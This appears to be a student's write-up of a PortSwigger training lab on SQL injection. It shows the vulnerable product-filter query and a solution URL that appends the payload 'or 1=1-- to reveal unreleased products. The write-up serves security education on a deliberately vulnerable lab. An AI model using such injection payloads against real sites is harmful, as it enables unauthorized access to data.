# Lab 1

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#
## Excercise: 

This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

````
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

#
Level: Apprendice

Reference: https://portswigger.net/web-security/sql-injection
#
## Solution

Select one category to display the list of products, making the url redirect to something like this:

````
https://ac171f121e71094fc078c7ad006700c4.web-security-academy.net/filter?category=Corporate+gifts
````

To list all products in any category, add **"'or 1=1--"** in the end of the url:

````
https://ac841f9a1e7a0992c090bc1b00f4003e.web-security-academy.net/filter?category=Pets%27+or+1=1--
````

![Alt text](images/lab_1/lab1_solution.png?raw=true "Title")